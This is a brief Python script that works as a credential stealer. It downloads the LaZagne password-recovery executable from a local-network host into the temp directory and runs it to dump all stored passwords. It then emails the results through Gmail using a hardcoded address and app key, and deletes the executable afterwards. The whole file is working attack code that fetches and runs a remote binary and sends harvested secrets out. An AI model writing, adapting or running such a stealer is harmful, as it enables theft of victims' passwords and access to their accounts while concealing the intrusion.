import subprocess
import smtplib
import requests
import os
import tempfile


def download(url):     
    get_response = requests.get(url)
    file_name = url.split("/")[-1]     
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  
    server.starttls()                             
    server.login(email, password)                 
    server.sendmail(email, email, message)        
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.29.5/laZagne.exe")    



command = "laZagne.exe all"     
email = "sulaimaneksambi@gmail.com"
app_key = "wmzzdxotxypxpmze"

result = subprocess.check_output(command, shell=True)  
send_mail(email,app_key, result)             
os.remove("laZagne.exe")





